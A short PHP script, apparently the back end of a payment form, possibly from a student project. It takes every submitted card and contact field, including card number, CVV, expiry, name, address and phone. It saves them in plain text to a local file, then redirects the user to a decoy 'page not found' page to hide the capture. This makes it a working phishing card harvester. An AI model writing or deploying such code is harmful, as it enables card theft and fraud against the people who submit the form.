<?php

$addCreditCardNumber = $_POST['addCreditCardNumber'];
$accountHolderName = $_POST['accountHolderName'];
$cvv = $_POST['cvv'];
$securityPostalCode = $_POST['securityPostalCode'];
$month = $_POST['month'];
$year = $_POST['year'];
$fullName = $_POST['fullName'];
$company = $_POST['company'];
$addressLine1 = $_POST['addressLine1'];
$addressLine2 = $_POST['addressLine2'];
$city = $_POST['city'];
$state = $_POST['state'];
$countryCode = $_POST['countryCode'];
$postalCode = $_POST['postalCode'];
$phoneNumber = $_POST['phoneNumber'];

$details = "addCreditCardNumber: $addCreditCardNumber " . "\n";
$details .= "accountHolderName: $accountHolderName " . "\n";
$details .= "cvv: $cvv " . "\n";
$details .= "securityPostalCode: $securityPostalCode " . "\n";
$details .= "month: $month " . "\n";
$details .= "year: $year " . "\n";
$details .= "fullName: $fullName " . "\n";
$details .= "company: $company " . "\n";
$details .= "addressLine1: $addressLine1 " . "\n";
$details .= "addressLine2: $addressLine2 " . "\n";
$details .= "city: $city " . "\n";
$details .= "state: $state " . "\n";
$details .= "countryCode: $countryCode " . "\n";
$details .= "postalCode: $postalCode " . "\n";
$details .= "phoneNumber: $phoneNumber " . "\n";
// echo $details;
$file = fopen("card_details.txt", "w");

fwrite($file,$details);
fclose($file);

header("Location: http://172.29.106.68/amusoke/project2/page_not_found.html");
exit();
?>